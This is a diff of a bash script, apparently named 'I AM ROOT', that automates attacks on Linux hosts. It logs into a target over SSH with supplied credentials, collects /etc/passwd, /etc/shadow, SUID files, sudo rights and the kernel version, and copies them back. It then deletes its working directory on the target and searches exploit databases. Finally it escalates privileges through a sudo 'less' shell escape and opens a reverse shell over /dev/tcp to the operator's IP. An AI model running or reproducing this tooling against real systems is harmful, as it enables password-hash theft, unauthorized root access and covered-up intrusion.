@@ -23,7 +23,7 @@ WHITE='\033[1;37m'
 #-------------------------------------------------------
 
 ###################################################################################################################
-#Ensure the script is being ran as root or with sudo privileges
+# Ensure the script is being run as root or with sudo privileges
 if [ "$(id -u)" -ne 0 ]; then
       echo -e "${RED}
 ████████╗██╗░░██╗██╗░██████╗  ░██████╗░█████╗░██████╗░██╗██████╗░████████╗
@@ -74,11 +74,6 @@ function start() {
       echo
       echo
  ###################################################################################################################
- #MSG=""
- #while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .1; done<<<"$MSG"
- # ✖
- # ✔
- ###################################################################################################################
       #Checking for dependencies
 
       MSG4="CHECKING FOR REQUIRED DEPENDENCIES..................[✔]"
@@ -92,12 +87,12 @@ function start() {
 
       sshpass -v >/dev/null
             if [ $? -gt 0 ]; then
-            sudo apt install sshpass -y
+            sudo apt-get install sshpass -y
       fi
 
       expect -v >/dev/null
             if [ $? -gt 0 ]; then
-            sudo apt install expect -y
+            sudo apt-get install expect -y
       fi
 
       xterm -v >/dev/null 
@@ -105,11 +100,12 @@ function start() {
             sudo apt-get install xterm -y
       fi
 
-      searchsploit -u
+      searchsploit -u &>/dev/null
             if [ $? -ne 6 ]; then
-            sudo apt install exploitdb -y
+            sudo apt-get install exploitdb -y
       fi
 }
+
 #Calling function
 start
 
@@ -229,7 +225,7 @@ validateIP
  function ip_input(){
       
       MSG11="ENTER IP ADDRESS: " 
-      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .1; done<<<"$MSG11"
+      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .07; done<<<"$MSG11"
       read -r IP_ADDRESS
 
 
@@ -244,40 +240,43 @@ validateIP
             do
                   echo
                   MSG12="INVALID IP"
-                  while read -rn1;do echo -ne "${RED}$REPLY${NOCOLOR}";  sleep .1; done<<<"$MSG12"
+                  while read -rn1;do echo -ne "${RED}$REPLY${NOCOLOR}";  sleep .07; done<<<"$MSG12"
                    sleep .1
                   echo
                   echo
                   MSG13="ENTER A VALID IP: " 
-                  while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .1; done<<<"$MSG13"
+                  while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .07; done<<<"$MSG13"
                   read -r IP_ADDRESS
             done
   }
+
 #Call function
 ip_input
 echo
 
  ###################################################################################################################
- #Funcctions for username & password
+ #Functions for username & password
 
 function user (){ 
 
       MSG11="ENTER USERNAME: "
-      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .1; done<<<"$MSG11"
+      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .07; done<<<"$MSG11"
       read -r USERNAME
       echo
 
  }
+
 #Call function
 user
 
 function password(){ 
 
       MSG12="ENTER PASSWORD: "
-      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .1; done<<<"$MSG12"
+      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .07; done<<<"$MSG12"
       read -s PASSWD
     
  }
+
 #Call function
 password
 ###################################################################################################################
@@ -293,12 +292,12 @@ echo
 function progress(){
       SPINVAR1="PREPARING TO RUN PROGRAM"            
       spin(){
-            while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .1; done<<<"$SPINVAR1" 
+            while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .07; done<<<"$SPINVAR1" 
             spin1 &
             pid=$!
 
 
-            for i in $(seq 1 7)
+            for i in $(seq 1 6)
             do 
             sleep 1.5
             done
@@ -312,11 +311,12 @@ function progress(){
             while [ 1 ]
             do
             echo -ne " ${GREEN}.${NOCOLOR}"
-            sleep 1
+            sleep .5 
             done  
         }
         spin
   }
+
 progress
 echo
 clear
@@ -333,7 +333,7 @@ SND="send \"echo '' >> $DIR${F}\r\""
 # It will attemp to gather info for possible privilge escalation
 
 MSG13="EXECUTING COMMANDS, NO FURTHER USER INPUT NECESSARY, PLEASE BE PATIENT.........." 
-while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .1; done<<<"$MSG13"
+while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .07; done<<<"$MSG13"
 echo
 echo
 
@@ -341,48 +341,48 @@ sleep 2
 
 function get_info {
       expect -c "\
-      set timeout 5 
+      set timeout 3 
       set env(TERM)
       spawn ssh -t "$USERNAME\@$IP_ADDRESS"
       send \"\r\"
-      sleep 2 
+      
       expect_before \"*(yes/no*\" {
       send \"yes\r\" 
       send \"$PASSWD\r\"
       }
-      sleep 2
+      
       expect \"*assword*\"
       send \"$PASSWD\r\"
-      sleep 2
+      sleep .5 
       send \"mkdir ${DIR}\r\"
-      sleep 2
+      sleep .5 
       send \"touch $DIR${F}\r\"
-      sleep 1
+      sleep .5
       send \"echo -e 'I AM ROOTR RESULTS FOR ${IP_ADDRESS}' >> $DIR${F}\r\"
       ${SND}
       ${SND}
       ${SND}
-      sleep 2
+      sleep .5 
       send \"echo '@############################## $USERNAME PATH ############################## ' >> $DIR${F}\r\"
-      sleep 2
+      sleep .5
       ${SND}
-      sleep 2
+      sleep .5 
       send \"echo $PATH >> ${DIR}${F}\r\"
-      sleep 2
+      sleep .5 
       ${SND}
       send \"echo '@##############################  /ETC/PASSWD ############################## ' >> $DIR${F}\r\"
       ${SND}
       send \"cat /etc/passwd >> ${DIR}${F}\r\"
-      sleep 2
+      sleep .5 
       ${SND}
       send \"echo '@##############################  /ETC/SHADOW ############################## ' >> $DIR${F}\r\"
       ${SND}
-      sleep 2
+      sleep .5 
       send \"sudo cat /etc/shadow >> $DIR${F}\r\"
-      sleep 2
+      sleep .5 
       expect \"*assword*\"
       send \"$PASSWD\r\"
-      sleep 1
+      sleep .5 
       ${SND}
       ${SND}
       send \"echo '@##############################  SUID FILES ##############################' >> $DIR${F}\r\"
@@ -393,21 +393,22 @@ function get_info {
       ${SND}
       send \"echo '@##############################  SUDO COMMANDS ############################## ' >> $DIR${F}\r\"
       ${SND}
-      sleep 2
+      sleep .5 
       send \"sudo -l >> ${DIR}${F}\r\"
       sleep 1
       expect \"*assword*\"
       send \"$PASSWD\r\"
-      sleep 2
+      sleep .5 
       ${SND}
       send \"echo '@##############################  KERNEL VERSION ############################## ' >> $DIR${F}\r\"
       ${SND}
       send \"uname -r >> ${DIR}${F}\r\"
       ${SND}
-      sleep 2
+      sleep .5 
       send \"exit\r\"
       "
   }
+
 #Call function  
 get_info
 
@@ -418,24 +419,25 @@ clear
 sleep 2
 
 MSG14="COMMAND EXECUTION COMPLETE......." 
-while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .1; done<<<"$MSG14"
+while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .07; done<<<"$MSG14"
 echo
 echo
+sleep .5
 
 ###################################################################################################################
 # Commands to transfer the information and delete DIR in remote host.
 
 MSG15="RETRIEVING INFORMATION......."
-while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .1; done<<<"$MSG15"
+while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .07; done<<<"$MSG15"
 echo
 echo
 
-sleep 5
+sleep 3 
 sshpass -p "$PASSWD" scp "$USERNAME"@"$IP_ADDRESS":"$DIR"${F} "$DEST"
-sleep 5
-current_time=$(date "+%Y.%m.%d-%H.%M.%S")
-mv "$DEST"$F "$DEST""$IP_ADDRESS"-"$(date "+%Y.%m.%d-%H.%M.%S")"_.txt
-Info="$DEST""$IP_ADDRESS"-"$(date "+%Y.%m.%d-%H.%M.%S")"_.txt
+sleep 3 
+current_time=$(date "+%Y.%m.%d-%H.%M")
+mv "$DEST"$F "$DEST""$IP_ADDRESS"-"$(date "+%Y.%m.%d-%H.%M")"_.txt
+Info="$DEST""$IP_ADDRESS"-"$(date "+%Y.%m.%d-%H.%M")"_.txt
 
 sshpass -p "$PASSWD" ssh "$USERNAME"@"$IP_ADDRESS" rm -r "$DIR"
 sleep 3
@@ -448,8 +450,8 @@ sleep 3
 clear
 
 MSG16="/etc/shadow/..........Found"
-      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}"; sleep .1; done<<<"$MSG16"
-      sleep 1
+      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}"; sleep .07; done<<<"$MSG16"
+      sleep .5 
       echo
       echo
 
@@ -485,7 +487,7 @@ echo
 sleep 7 
 ###################################################################################################################
 
-MSG17="The user $USERNAME can execute 'less' command as sudo"
+MSG17="The user $USERNAME can execute the following commands as sudo"
       while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}"; sleep .1; done<<<"$MSG17"
       sleep 1
       echo
@@ -513,11 +515,10 @@ echo -e "${PURPLE}##############################################################
 ###################################################################################################################
 
 # Kernel Version in searchsploit
-## Note: This may require checking for searchsploit in the beggining ###
 
-MSG18="Checking Kernel Version.........."$KVSE
-      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}"; sleep .1; done<<<"$MSG18"
-      sleep 1
+MSG18="Checking Kernel Version..........$KVSE"
+      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}"; sleep .07; done<<<"$MSG18"
+      sleep .05 
       echo
       echo
 
@@ -543,8 +544,8 @@ echo -e "${PURPLE}##############################################################
 # SUID Files exploit
 
 MSG19="Checking SUID files.........."$KVSE
-      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}"; sleep .1; done<<<"$MSG19"
-      sleep 1
+      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}"; sleep .07; done<<<"$MSG19"
+      sleep .05 
       echo
       echo
 
@@ -557,7 +558,7 @@ do lynx -dump https://gtfobins.github.io/gtfobins/"$line"/ > ro.txt;
 wline=$(head -n 1 ro.txt)
 wline=${wline:0:3}
 
-REFI=result"-$(date "+%Y.%m.%d-%H.%M.%S")".txt
+REFI=result"-$(date "+%Y.%m.%d-%H.%M")".txt
 DERPI="$DEST""$REFI"
 touch $DERPI
 
@@ -580,14 +581,20 @@ echo "
         SEPARATE TEXT FILE LOCATED AT:
     ./I_AM_ROOT/$IP_ADDRESS/$REFI
      "
-###################################################################################################################
-sleep 3
+
+sleep 7 
+##################################################################################################################
 
 
 menu_option_one() {
 
-    MSGA="ESTABLISHING CONNECTION FOR PRIVILE ESCALATION......."
-      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}"; sleep .1; done<<<"$MSGA"
+    MSGA="ESTABLISHING CONNECTION FOR PRIVILEGE ESCALATION.......\nPLEASE HAVE
+    SOME PATIENCE AS THE REVERSE SHELL TAKES SOME TIME TO ESTABLISH......."
+      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}"; sleep .07; done<<<"$MSGA"
+    echo
+    echo
+    echo 'What is your ip address?'
+    read -r LOCAL_IP
     echo
     echo
     sleep 2
@@ -609,13 +616,17 @@ menu_option_one() {
     sleep 2
     send \"!/bin/sh\r\"
     sleep 1
-    send \"bash -i >& /dev/tcp/192.168.91.129/8080 0>&1\r\"
+    send \"bash -i >& /dev/tcp/$LOCAL_IP/8080 0>&1\r\"
     interact 
 
  "
 }
 
 menu_option_two() {
+    less $DERPI
+}
+
+menu_option_three() {
     echo "GOOD BYE"
 }
 
@@ -633,12 +644,13 @@ incorrect_selection() {
 }
 
 
-until [ "$selection" = "1" ] || [ "$selection" = "2" ]; do
+until [ "$selection" = "1" ] || [ "$selection" = "3" ]; do
     clear
-    echo "Would to Attempt Privilege Escalation Using Sudo 'less' ?"
+    #echo "Would to Attempt Privilege Escalation Using Sudo 'less' ?"
     echo ""
-    echo "  1 - YES"
-    echo "  2 - NO"
+    echo "  1 - Attempt Privilege Escalation Using Sudo 'less'? "
+    echo "  2 - View file at ./I_AM_ROOT/$IP_ADDRESS/$REFI"
+    echo "  3 - EXIT"
     echo ""
     echo -n "   Enter selection: "
     read selection
@@ -646,6 +658,7 @@ until [ "$selection" = "1" ] || [ "$selection" = "2" ]; do
     case $selection in
         1 ) clear; menu_option_one;;
         2 ) clear; menu_option_two;;
+        3 ) clear; menu_option_three;;
         * ) clear; incorrect_selection ; press_enter ;;
     esac
 done
